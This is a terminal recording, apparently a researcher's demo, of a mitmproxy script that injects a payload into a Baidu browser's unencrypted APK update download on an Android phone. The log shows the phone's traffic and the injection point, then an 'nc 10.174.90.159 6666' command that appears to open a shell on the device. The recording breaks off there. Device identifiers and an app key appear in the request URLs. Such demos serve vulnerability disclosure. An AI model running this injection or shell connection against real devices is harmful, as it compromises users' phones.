@@ -1,0 +1,838 @@
+{
+  "version": 1,
+  "width": 107,
+  "height": 37,
+  "duration": 39.609390,
+  "command": "/bin/zsh",
+  "title": "",
+  "env": {
+    "TERM": "xterm-256color",
+    "SHELL": "/bin/zsh"
+  },
+  "stdout": [
+    [
+      0.085415,
+      "\u001b[1m\u001b[7m%\u001b[27m\u001b[1m\u001b[0m                                                                                                          \r \r"
+    ],
+    [
+      0.000026,
+      "\u001b]2;rotlogix@carcass: ~/Tools/mitmproxy-0.15-osx\u0007"
+    ],
+    [
+      0.000009,
+      "\u001b]1;..roxy-0.15-osx\u0007"
+    ],
+    [
+      0.012792,
+      "\r\u001b[0m\u001b[27m\u001b[24m\u001b[J\u001b[31m┌[\u001b[01;37mrotlogix\u001b[00m\u001b[31m@\u001b[01;37mcarcass\u001b[00m\u001b[31m] [\u001b[01;37m/dev/ttys003\u001b[00m\u001b[31m] \r\n\u001b[31m└[\u001b[01;37m~/Tools/mitmproxy-0.15-osx\u001b[00m\u001b[31m]\u003e\u001b[00m "
+    ],
+    [
+      0.000019,
+      "\u001b[K"
+    ],
+    [
+      0.000108,
+      "\u001b[?1h\u001b="
+    ],
+    [
+      0.781639,
+      "."
+    ],
+    [
+      0.000076,
+      "\u0008./"
+    ],
+    [
+      0.000035,
+      "m"
+    ],
+    [
+      0.000065,
+      "i"
+    ],
+    [
+      0.000029,
+      "t"
+    ],
+    [
+      0.000050,
+      "m"
+    ],
+    [
+      0.000033,
+      "d"
+    ],
+    [
+      0.000051,
+      "u"
+    ],
+    [
+      0.000034,
+      "m"
+    ],
+    [
+      0.000041,
+      "p"
+    ],
+    [
+      0.000107,
+      " "
+    ],
+    [
+      0.000064,
+      "-"
+    ],
+    [
+      0.000023,
+      "s"
+    ],
+    [
+      0.000002,
+      " "
+    ],
+    [
+      0.000062,
+      "m"
+    ],
+    [
+      0.000033,
+      "i"
+    ],
+    [
+      0.000056,
+      "t"
+    ],
+    [
+      0.000046,
+      "m"
+    ],
+    [
+      0.000043,
+      "d"
+    ],
+    [
+      0.000021,
+      "u"
+    ],
+    [
+      0.000041,
+      "m"
+    ],
+    [
+      0.000045,
+      "p"
+    ],
+    [
+      0.000034,
+      "-"
+    ],
+    [
+      0.000043,
+      "s"
+    ],
+    [
+      0.000043,
+      "c"
+    ],
+    [
+      0.000044,
+      "r"
+    ],
+    [
+      0.000039,
+      "i"
+    ],
+    [
+      0.000044,
+      "p"
+    ],
+    [
+      0.000046,
+      "t"
+    ],
+    [
+      0.000046,
+      "."
+    ],
+    [
+      0.000030,
+      "p"
+    ],
+    [
+      0.000041,
+      "y"
+    ],
+    [
+      0.569858,
+      "\u001b[?1l\u001b\u003e"
+    ],
+    [
+      0.000078,
+      "\r\r\n"
+    ],
+    [
+      0.002149,
+      "\u001b]2;./mitmdump -s mitmdump-script.py\u0007\u001b]1;./mitmdump\u0007"
+    ],
+    [
+      0.321880,
+      "\u001b[22m[*] Starting APK Injection!\u001b[0m\r\n"
+    ],
+    [
+      4.600096,
+      "\u001b[22m10.174.90.159:49617: clientconnect\u001b[0m\r\n"
+    ],
+    [
+      0.000094,
+      "\u001b[22m10.174.90.159:42707: clientconnect\u001b[0m\r\n"
+    ],
+    [
+      0.003774,
+      "\u001b[22m10.174.90.159:46904: clientconnect\u001b[0m\r\n"
+    ],
+    [
+      0.091996,
+      "\u001b[1m10.174.90.159\u001b[0m \u001b[32m\u001b[1mGET\u001b[0m \u001b[1mhttp://api.mobula.sdk.duapps.com/adunion/slot/getSrcPrio?h=1776\u0026w=1080\u0026model=Nexus+5\u0026vendor=LGE\u0026sdk=19\u0026dpi=480\u0026sv=1.0.7.1\u0026svn=MW-1.0.7.1\u0026pkg=com.baidu.browser.inter\u0026v=159\u0026vn=6.3.0.1\u0026locale=en_US\u0026ntt=WIFI\u0026ls=02b288acfb45f9a095bc28c9965855ec\u0026aid=83fa4ffcf56b3b15\u0026sid=10326%2C10046%2C10325%2C10045%2C10256%2C10185%2C10174%2C10049%2C10139\u0026res=1080*460%2C244*244%2C170*170%2C108*108\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000073,
+      " \u001b[1m\u003c\u003c\u001b[0m \u001b[32m\u001b[1m\u001b[25m200\u001b[0m \u001b[32m\u001b[1mOK\u001b[0m \u001b[1m254B\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.008277,
+      "\u001b[22m10.174.90.159:46904: clientdisconnect\u001b[0m\r\n"
+    ],
+    [
+      0.080842,
+      "\u001b[22m10.174.90.159:44946: clientconnect\u001b[0m\r\n"
+    ],
+    [
+      0.228618,
+      "\u001b[1m10.174.90.159\u001b[0m \u001b[32m\u001b[1mGET\u001b[0m \u001b[1mhttps://graph.facebook.com/v2.4/178876342259331?fields=supports_implicit_sdk_logging%2Cgdpv4_nux_content%2Cgdpv4_nux_enabled%2Candroid_dialog_configs%2Candroid_sdk_error_categories\u0026format=json\u0026sdk=android\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000076,
+      " \u001b[1m\u003c\u003c\u001b[0m \u001b[32m\u001b[1m\u001b[25m200\u001b[0m \u001b[32m\u001b[1mOK\u001b[0m \u001b[1m429B\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.144021,
+      "\u001b[1m10.174.90.159\u001b[0m \u001b[32m\u001b[1mGET\u001b[0m \u001b[1mhttp://mobile-global.baidu.com/mbrowser/deeplink/getLinkedApps?pack=com.baidu.browser.inter\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000064,
+      " \u001b[1m\u003c\u003c\u001b[0m \u001b[32m\u001b[1m\u001b[25m200\u001b[0m \u001b[32m\u001b[1mOK\u001b[0m \u001b[1m227B\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.035440,
+      "\u001b[22m10.174.90.159:49517: clientconnect\u001b[0m\r\n"
+    ],
+    [
+      0.055469,
+      "\u001b[22m[Baidu APK Injection] Target host : s.mobile-global.baidu.com\u001b[0m\r\n"
+    ],
+    [
+      0.102570,
+      "\u001b[1m10.174.90.159\u001b[0m \u001b[32m\u001b[1mGET\u001b[0m \u001b[1mhttp://mobile-global.baidu.com/mbrowser/search/hotword?api=2\u0026pt=ma\u0026co=US\u0026la=en\u0026ch=gp\u0026av=6.3.0.1\u0026sv=a_19\u0026pr=\u0026n=null\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000068,
+      " \u001b[1m\u003c\u003c\u001b[0m \u001b[32m\u001b[1m\u001b[25m200\u001b[0m \u001b[32m\u001b[1mOK\u001b[0m \u001b[1m389B\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.003862,
+      "\u001b[1m10.174.90.159\u001b[0m \u001b[32m\u001b[1mGET\u001b[0m \u001b[1mhttp://s.mobile-global.baidu.com/mbrowser/guanxing/Deeplink/js/com.baidu.androidstore/880d6a1721ee42ddb19b26df7cc8cd8f_20150921.js\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000095,
+      " \u001b[1m\u003c\u003c\u001b[0m \u001b[32m\u001b[1m\u001b[25m200\u001b[0m \u001b[32m\u001b[1mOK\u001b[0m \u001b[1m353B\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.349309,
+      "\u001b[1m10.174.90.159\u001b[0m \u001b[32m\u001b[1mGET\u001b[0m \u001b[1mhttp://mobile-global.baidu.com/mbrowser?function=get_config\u0026ver=1\u0026dver=1\u0026cuid=B97AA5AB60D798B84ED0080AF8E48B8A%124000000000000000\u0026lang=gb\u0026ch=gp\u0026ov=4.4.3\u0026sv=6.3.0.1\u0026sw=1080\u0026sh=1920\u0026tm=1456603959350\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000092,
+      " \u001b[1m\u003c\u003c\u001b[0m \u001b[32m\u001b[1m\u001b[25m200\u001b[0m \u001b[32m\u001b[1mOK\u001b[0m \u001b[1m13B\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      6.007213,
+      "\u001b[22m10.174.90.159:37986: clientconnect\u001b[0m\r\n"
+    ],
+    [
+      0.026211,
+      "\u001b[22m10.174.90.159:56124: clientconnect\u001b[0m\r\n"
+    ],
+    [
+      0.124099,
+      "\u001b[22m10.174.90.159:56845: clientconnect\u001b[0m\r\n"
+    ],
+    [
+      0.000078,
+      "\u001b[22m10.174.90.159:51776: clientconnect\u001b[0m\r\n"
+    ],
+    [
+      0.000091,
+      "\u001b[22m10.174.90.159:57197: clientconnect\u001b[0m\r\n"
+    ],
+    [
+      0.036023,
+      "\u001b[22m10.174.90.159:56143: clientconnect\u001b[0m\r\n"
+    ],
+    [
+      0.033474,
+      "\u001b[1m10.174.90.159\u001b[0m \u001b[32m\u001b[1mGET\u001b[0m \u001b[1mhttp://mobile-global.baidu.com/mbrowser/sug/list?pt=ma\u0026co=US\u0026la=en\u0026ch=gp\u0026av=6.3.0.1\u0026sv=a_19\u0026pr=\u0026n=8cbc1ad9d467e8157b10d0e130f67a73\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000069,
+      " \u001b[1m\u003c\u003c\u001b[0m \u001b[32m\u001b[1m\u001b[25m200\u001b[0m \u001b[32m\u001b[1mOK\u001b[0m \u001b[1m1.61kB\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.167872,
+      "\u001b[22m10.174.90.159:49275: clientconnect\u001b[0m\r\n"
+    ],
+    [
+      0.093459,
+      "\u001b[22m10.174.90.159:54200: clientconnect\u001b[0m\r\n"
+    ],
+    [
+      0.000077,
+      "\u001b[22m10.174.90.159:50500: clientconnect\u001b[0m\r\n"
+    ],
+    [
+      0.006318,
+      "\u001b[1m10.174.90.159\u001b[0m \u001b[32m\u001b[1mGET\u001b[0m \u001b[1mhttp://mobile-global.baidu.com/mbrowser/management/get_searchengine.do?api=1\u0026pt=ma\u0026co=US\u0026la=en\u0026ch=gp\u0026av=6.3.0.1\u0026sv=a_19\u0026pr=\u0026n=\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000127,
+      " \u001b[1m\u003c\u003c\u001b[0m \u001b[32m\u001b[1m\u001b[25m200\u001b[0m \u001b[32m\u001b[1mOK\u001b[0m \u001b[1m1.6kB\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.003343,
+      "\u001b[1m10.174.90.159\u001b[0m \u001b[32m\u001b[1mGET\u001b[0m \u001b[1mhttp://mobile-global.baidu.com/mbrowser/popup/getPopup?api=1\u0026pt=ma\u0026co=US\u0026la=en\u0026ch=gp\u0026av=6.3.0.1\u0026sv=a_19\u0026pr=\u0026n=\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000270,
+      " \u001b[1m\u003c\u003c\u001b[0m \u001b[32m\u001b[1m\u001b[25m200\u001b[0m \u001b[32m\u001b[1mOK\u001b[0m \u001b[1m7B\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.019467,
+      "\u001b[22m10.174.90.159:37986: clientdisconnect\u001b[0m\r\n"
+    ],
+    [
+      0.078616,
+      "\u001b[1m10.174.90.159\u001b[0m \u001b[32m\u001b[1mGET\u001b[0m \u001b[1mhttp://br.bmbs.baidu.com/reportinfo.php?ua=bd_1080_1776_LGE-Nexus+5-4-4-3_6-3-0-1_j2\u0026cuid=B97AA5AB60D798B84ED0080AF8E48B8A%7C000000000000000\u0026cfrom=gp\u0026lfrom=gp\u0026from=gp\u0026it=0\u0026ctv=1\u0026vn=0\u0026sn=0\u0026sf=0\u0026ref=\u0026vfy=a9d690e810acaab86d79cd8e84ef9014\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000059,
+      " \u001b[1m\u003c\u003c\u001b[0m \u001b[32m\u001b[1m\u001b[25m200\u001b[0m \u001b[32m\u001b[1mOK\u001b[0m \u001b[1m0B\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.008585,
+      "\u001b[22m10.174.90.159:56124: clientdisconnect\u001b[0m\r\n"
+    ],
+    [
+      0.019336,
+      "\u001b[22m10.174.90.159:38902: clientconnect\u001b[0m\r\n"
+    ],
+    [
+      0.033169,
+      "\u001b[1m10.174.90.159\u001b[0m \u001b[32m\u001b[1mGET\u001b[0m \u001b[1mhttp://mobile-global.baidu.com/mbrowser/promotion/get_advertisement_conf?pt=ma\u0026co=US\u0026la=en\u0026ch=gp\u0026av=6.3.0.1\u0026sv=a_19\u0026pr=\u0026api=3\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000025,
+      " \u001b[1m\u003c\u003c\u001b[0m \u001b[32m\u001b[1m\u001b[25m200\u001b[0m \u001b[32m\u001b[1mOK\u001b[0m \u001b[1m149B\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.053851,
+      "\u001b[1m10.174.90.159\u001b[0m \u001b[32m\u001b[1mGET\u001b[0m \u001b[1mhttp://mobile-global.baidu.com/mbrowser/management/get_squaredup.do?cu=\u0026of=gp\u0026api=3\u0026pt=ma\u0026co=US\u0026la=en\u0026ch=gp\u0026av=6.3.0.1\u0026sv=a_19\u0026pr=\u0026n=null\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000031,
+      " \u001b[1m\u003c\u003c\u001b[0m \u001b[32m\u001b[1m\u001b[25m200\u001b[0m \u001b[32m\u001b[1mOK\u001b[0m \u001b[1m1.96kB\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.003838,
+      "\u001b[1m10.174.90.159\u001b[0m \u001b[32m\u001b[1mGET\u001b[0m \u001b[1mhttp://mobile-global.baidu.com/mbrowser/management/apk_version_update.do?\u0026api=2\u0026pt=ma\u0026co=US\u0026la=en\u0026ch=gp\u0026av=6.3.0.1\u0026sv=a_19\u0026pr=\u0026n=null\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000070,
+      " \u001b[1m\u003c\u003c\u001b[0m \u001b[32m\u001b[1m\u001b[25m200\u001b[0m \u001b[32m\u001b[1mOK\u001b[0m \u001b[1m53B\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.081159,
+      "\u001b[1m10.174.90.159\u001b[0m \u001b[35m\u001b[1mPOST\u001b[0m \u001b[1mhttp://mobile-global.baidu.com/mbrowser/stat/pv.do\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000050,
+      " \u001b[1m\u003c\u003c\u001b[0m \u001b[32m\u001b[1m\u001b[25m200\u001b[0m \u001b[32m\u001b[1mOK\u001b[0m \u001b[1m0B\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.113428,
+      "\u001b[22m10.174.90.159:50948: clientconnect\u001b[0m\r\n"
+    ],
+    [
+      0.002654,
+      "\u001b[1m10.174.90.159\u001b[0m \u001b[35m\u001b[1mPOST\u001b[0m \u001b[1mhttps://track.appsflyer.com/api/v2.3/androidevent?buildnumber=1.15\u0026app_id=com.baidu.browser.inter\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000088,
+      " \u001b[1m\u003c\u003c\u001b[0m \u001b[32m\u001b[1m\u001b[25m200\u001b[0m \u001b[32m\u001b[1mOK\u001b[0m \u001b[1m2B\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000147,
+      "\u001b[1m10.174.90.159\u001b[0m \u001b[35m\u001b[1mPOST\u001b[0m \u001b[1mhttp://rts.mobula.sdk.duapps.com/orts/rpb?h=1776\u0026w=1080\u0026model=Nexus+5\u0026vendor=LGE\u0026sdk=19\u0026dpi=480\u0026sv=1.0.7.1\u0026svn=MW-1.0.7.1\u0026pkg=com.baidu.browser.inter\u0026v=159\u0026vn=6.3.0.1\u0026locale=en_US\u0026ntt=WIFI\u0026ls=02b288acfb45f9a095bc28c9965855ec\u0026aid=83fa4ffcf56b3b15\u0026mdu=adsdk\u0026rv=1.0\u0026ts=1456603965964\u0026seq=0\u0026stype=behavior\u0026s=d04c50bb9fd9cd9e2db96738c2f3e8c3\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000085,
+      " \u001b[1m\u003c\u003c\u001b[0m \u001b[32m\u001b[1m\u001b[25m200\u001b[0m \u001b[32m\u001b[1mOK\u001b[0m \u001b[1m81B\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.001824,
+      "\u001b[22m10.174.90.159:56143: clientdisconnect\u001b[0m\r\n"
+    ],
+    [
+      0.000101,
+      "\u001b[22m10.174.90.159:49275: clientdisconnect\u001b[0m\r\n"
+    ],
+    [
+      0.003810,
+      "\u001b[22m[Baidu APK Injection] Target host : s.mobile-global.baidu.com\u001b[0m\r\n"
+    ],
+    [
+      0.009760,
+      "\u001b[22m10.174.90.159:43877: clientconnect\u001b[0m\r\n"
+    ],
+    [
+      0.011194,
+      "\u001b[22m[Baidu APK Injection] Target host : s.mobile-global.baidu.com\u001b[0m\r\n"
+    ],
+    [
+      0.003127,
+      "\u001b[1m10.174.90.159\u001b[0m \u001b[32m\u001b[1mGET\u001b[0m \u001b[1mhttp://mobile-global.baidu.com/mbrowser/management/config.do?api=2\u0026pt=ma\u0026co=US\u0026la=en\u0026ch=gp\u0026av=6.3.0.1\u0026sv=a_19\u0026pr=\u0026n=null\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000058,
+      " \u001b[1m\u003c\u003c\u001b[0m \u001b[32m\u001b[1m\u001b[25m200\u001b[0m \u001b[32m\u001b[1mOK\u001b[0m \u001b[1m513B\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.017176,
+      "\u001b[22m10.174.90.159:55358: clientconnect\u001b[0m\r\n"
+    ],
+    [
+      0.020402,
+      "\u001b[1m10.174.90.159\u001b[0m \u001b[35m\u001b[1mPOST\u001b[0m \u001b[1mhttp://rts.mobula.sdk.duapps.com/orts/rpb?h=1776\u0026w=1080\u0026model=Nexus+5\u0026vendor=LGE\u0026sdk=19\u0026dpi=480\u0026sv=1.0.7.1\u0026svn=MW-1.0.7.1\u0026pkg=com.baidu.browser.inter\u0026v=159\u0026vn=6.3.0.1\u0026locale=en_US\u0026ntt=WIFI\u0026ls=02b288acfb45f9a095bc28c9965855ec\u0026aid=83fa4ffcf56b3b15\u0026mdu=adsdk\u0026rv=1.0\u0026ts=1456603966087\u0026seq=0\u0026stype=behavior\u0026s=7b0d86b612e8be857cc8a5c60ea90a0e\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000065,
+      " \u001b[1m\u003c\u003c\u001b[0m \u001b[32m\u001b[1m\u001b[25m200\u001b[0m \u001b[32m\u001b[1mOK\u001b[0m \u001b[1m81B\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.004185,
+      "\u001b[22m10.174.90.159:50500: clientdisconnect\u001b[0m\r\n"
+    ],
+    [
+      0.003191,
+      "\u001b[1m10.174.90.159\u001b[0m \u001b[32m\u001b[1mGET\u001b[0m \u001b[1mhttp://s.mobile-global.baidu.com/mbrowser/guanxing/website/imgs/v5/ba725fa672b94f3aa0f8a4e3ca018eda.png\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000058,
+      " \u001b[1m\u003c\u003c\u001b[0m \u001b[32m\u001b[1m\u001b[25m200\u001b[0m \u001b[32m\u001b[1mOK\u001b[0m \u001b[1m2.83kB\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.044884,
+      "\u001b[1m10.174.90.159\u001b[0m \u001b[32m\u001b[1mGET\u001b[0m \u001b[1mhttp://mobile-global.baidu.com/mbrowser/mvideo/getCyberPlayerCore?cpu=ARMV7_NEON\u0026cpsv=1.7.1.2\u0026api=1\u0026pt=ma\u0026co=US\u0026la=en\u0026ch=gp\u0026av=6.3.0.1\u0026sv=a_19\u0026pr=\u0026n=\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000132,
+      " \u001b[1m\u003c\u003c\u001b[0m \u001b[32m\u001b[1m\u001b[25m200\u001b[0m \u001b[32m\u001b[1mOK\u001b[0m \u001b[1m174B\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.036680,
+      "\u001b[1m10.174.90.159\u001b[0m \u001b[32m\u001b[1mGET\u001b[0m \u001b[1mhttp://s.mobile-global.baidu.com/mbrowser/guanxing/website/imgs/v5/b3268e207dc64f0199f054c2e1c62c8e.png\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000088,
+      " \u001b[1m\u003c\u003c\u001b[0m \u001b[32m\u001b[1m\u001b[25m200\u001b[0m \u001b[32m\u001b[1mOK\u001b[0m \u001b[1m37.93kB\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.021961,
+      "\u001b[1m10.174.90.159\u001b[0m \u001b[32m\u001b[1mGET\u001b[0m \u001b[1mhttp://mobile-global.baidu.com/mbrowser/window/floatwindow?pt=ma\u0026co=US\u0026la=en\u0026ch=gp\u0026av=6.3.0.1\u0026sv=a_19\u0026pr=\u0026n=\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000038,
+      " \u001b[1m\u003c\u003c\u001b[0m \u001b[32m\u001b[1m\u001b[25m200\u001b[0m \u001b[32m\u001b[1mOK\u001b[0m \u001b[1m28B\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.094046,
+      "\u001b[1m10.174.90.159\u001b[0m \u001b[32m\u001b[1mGET\u001b[0m \u001b[1mhttp://mobile-global.baidu.com/mbrowser/management/red_point_update.do?api=1\u0026pt=ma\u0026co=US\u0026la=en\u0026ch=gp\u0026av=6.3.0.1\u0026sv=a_19\u0026pr=\u0026n=null\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000064,
+      " \u001b[1m\u003c\u003c\u001b[0m \u001b[32m\u001b[1m\u001b[25m200\u001b[0m \u001b[32m\u001b[1mOK\u001b[0m \u001b[1m7B\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.152089,
+      "\u001b[22m10.174.90.159:45746: clientconnect\u001b[0m\r\n"
+    ],
+    [
+      0.000226,
+      "\u001b[1m10.174.90.159\u001b[0m \u001b[32m\u001b[1mGET\u001b[0m \u001b[1mhttp://mobile-global.baidu.com/mbrowser/promotion/get_splashengine.do?api=2\u0026pt=ma\u0026co=US\u0026la=en\u0026ch=gp\u0026av=6.3.0.1\u0026sv=a_19\u0026pr=\u0026n=\u0026screen_size=1080*1920\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000116,
+      " \u001b[1m\u003c\u003c\u001b[0m \u001b[32m\u001b[1m\u001b[25m200\u001b[0m \u001b[32m\u001b[1mOK\u001b[0m \u001b[1m7B\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.026703,
+      "\u001b[22m10.174.90.159:51776: clientdisconnect\u001b[0m\r\n"
+    ],
+    [
+      0.035389,
+      "\u001b[1m10.174.90.159\u001b[0m \u001b[32m\u001b[1mGET\u001b[0m \u001b[1mhttp://mobile-global.baidu.com/mbrowser/getlist?api=1\u0026pt=ma\u0026co=US\u0026la=en\u0026ch=gp\u0026av=6.3.0.1\u0026sv=a_19\u0026pr=\u0026n=null\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000045,
+      " \u001b[1m\u003c\u003c\u001b[0m \u001b[32m\u001b[1m\u001b[25m200\u001b[0m \u001b[32m\u001b[1mOK\u001b[0m \u001b[1m490B\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.073084,
+      "\u001b[22m10.174.90.159:50948: clientdisconnect\u001b[0m\r\n"
+    ],
+    [
+      0.257821,
+      "\u001b[1m10.174.90.159\u001b[0m \u001b[32m\u001b[1mGET\u001b[0m \u001b[1mhttps://api.appsflyer.com/install_data/v3/com.baidu.browser.inter?devkey=FTimQoWqtTCkCQPhpAxk7X\u0026device_id=1456603939512-5746139668223129099\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000323,
+      " \u001b[1m\u003c\u003c\u001b[0m \u001b[32m\u001b[1m\u001b[25m200\u001b[0m \u001b[32m\u001b[1mOK\u001b[0m \u001b[1m57B\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.001284,
+      "\u001b[22m10.174.90.159:55358: clientdisconnect\u001b[0m\r\n"
+    ],
+    [
+      0.505203,
+      "\u001b[1m10.174.90.159\u001b[0m \u001b[35m\u001b[1mPOST\u001b[0m \u001b[1mhttp://mobile-global.baidu.com/mbrowser/message/subscribe\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000063,
+      " \u001b[1m\u003c\u003c\u001b[0m \u001b[32m\u001b[1m\u001b[25m200\u001b[0m \u001b[32m\u001b[1mOK\u001b[0m \u001b[1m4B\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.227061,
+      "\u001b[1m10.174.90.159\u001b[0m \u001b[32m\u001b[1mGET\u001b[0m \u001b[1mhttp://mobile-global.baidu.com/mbrowser/nav.do?api=1\u0026pt=ma\u0026co=US\u0026la=en\u0026ch=gp\u0026av=6.3.0.1\u0026sv=a_19\u0026pr=\u0026n=null\u0026ver=21\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000064,
+      " \u001b[1m\u003c\u003c\u001b[0m \u001b[32m\u001b[1m\u001b[25m200\u001b[0m \u001b[32m\u001b[1mOK\u001b[0m \u001b[1m6.76kB\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      1.007009,
+      "\u001b[1m10.174.90.159\u001b[0m \u001b[32m\u001b[1mGET\u001b[0m \u001b[1mhttp://mobile-global.baidu.com/mbrowser/management/zeus_update.do?si=12.1.0.0\u0026so=6.2.7.11\u0026zi=-\u0026zo=-\u0026api=1\u0026pt=ma\u0026co=US\u0026la=en\u0026ch=gp\u0026av=6.3.0.1\u0026sv=a_19\u0026pr=\u0026n=\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000108,
+      " \u001b[1m\u003c\u003c\u001b[0m \u001b[32m\u001b[1m\u001b[25m200\u001b[0m \u001b[32m\u001b[1mOK\u001b[0m \u001b[1m296B\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.110928,
+      "\u001b[22m10.174.90.159:36003: clientconnect\u001b[0m\r\n"
+    ],
+    [
+      0.022232,
+      "\u001b[22m[Baidu APK Injection] Target host : s.mobile-global.baidu.com\u001b[0m\r\n"
+    ],
+    [
+      0.000010,
+      "\u001b[22m[Baidu APK Injection] Target injection point : /mbrowser/guanxing/T5Update/res/54b2672d5353481ab5a762bdcd74977f.apk\u001b[0m\r\n"
+    ],
+    [
+      0.006830,
+      "\u001b[1m10.174.90.159\u001b[0m \u001b[32m\u001b[1mGET\u001b[0m \u001b[1mhttp://s.mobile-global.baidu.com/mbrowser/guanxing/T5Update/res/54b2672d5353481ab5a762bdcd74977f.apk\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000082,
+      " \u001b[1m\u003c\u003c\u001b[0m \u001b[32m\u001b[1m\u001b[25m200\u001b[0m \u001b[32m\u001b[1mOK\u001b[0m \u001b[1m786.29kB\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.243336,
+      "\u001b[22m10.174.90.159:36003: clientdisconnect\u001b[0m\r\n"
+    ],
+    [
+      0.182240,
+      "\u001b[1m10.174.90.159\u001b[0m \u001b[32m\u001b[1mGET\u001b[0m \u001b[1mhttp://mobile-global.baidu.com/mbrowser/home/getContentCardConfig?api=1\u0026pt=ma\u0026co=US\u0026la=en\u0026ch=gp\u0026av=6.3.0.1\u0026sv=a_19\u0026pr=\u0026n=null\u0026uuid=B97AA5AB60D798B84ED0080AF8E48B8A\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000453,
+      " \u001b[1m\u003c\u003c\u001b[0m \u001b[32m\u001b[1m\u001b[25m200\u001b[0m \u001b[32m\u001b[1mOK\u001b[0m \u001b[1m770B\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.034890,
+      "\u001b[22m10.174.90.159:43877: clientdisconnect\u001b[0m\r\n"
+    ],
+    [
+      2.415020,
+      "^C"
+    ],
+    [
+      0.109858,
+      "\u001b[1m\u001b[7m%\u001b[27m\u001b[1m\u001b[0m                                                                                                          \r \r"
+    ],
+    [
+      0.000080,
+      "\u001b]2;rotlogix@carcass: ~/Tools/mitmproxy-0.15-osx\u0007"
+    ],
+    [
+      0.000021,
+      "\u001b]1;..roxy-0.15-osx\u0007"
+    ],
+    [
+      0.012574,
+      "\r\u001b[0m\u001b[27m\u001b[24m\u001b[J\u001b[31m┌[\u001b[01;37mrotlogix\u001b[00m\u001b[31m@\u001b[01;37mcarcass\u001b[00m\u001b[31m] [\u001b[01;37m/dev/ttys003\u001b[00m\u001b[31m] \r\n\u001b[31m└[\u001b[01;37m~/Tools/mitmproxy-0.15-osx\u001b[00m\u001b[31m]\u003e\u001b[00m "
+    ],
+    [
+      0.000006,
+      "\u001b[K"
+    ],
+    [
+      0.000028,
+      "\u001b[?1h\u001b="
+    ],
+    [
+      7.282177,
+      "n"
+    ],
+    [
+      0.000097,
+      "\u0008nc"
+    ],
+    [
+      0.000059,
+      " "
+    ],
+    [
+      0.000095,
+      "1"
+    ],
+    [
+      0.000149,
+      "0"
+    ],
+    [
+      0.000100,
+      "."
+    ],
+    [
+      0.000061,
+      "1"
+    ],
+    [
+      0.000056,
+      "7"
+    ],
+    [
+      0.000033,
+      "4"
+    ],
+    [
+      0.000047,
+      "."
+    ],
+    [
+      0.000038,
+      "9"
+    ],
+    [
+      0.000060,
+      "0"
+    ],
+    [
+      0.000039,
+      "."
+    ],
+    [
+      0.000048,
+      "1"
+    ],
+    [
+      0.000056,
+      "5"
+    ],
+    [
+      0.000047,
+      "9"
+    ],
+    [
+      0.000007,
+      " "
+    ],
+    [
+      0.000052,
+      "6"
+    ],
+    [
+      0.000037,
+      "6"
+    ],
+    [
+      0.000059,
+      "6"
+    ],
+    [
+      0.000024,
+      "6"
+    ],
+    [
+      5.700665,
+      "\u001b[?1l\u001b\u003e"
+    ],
+    [
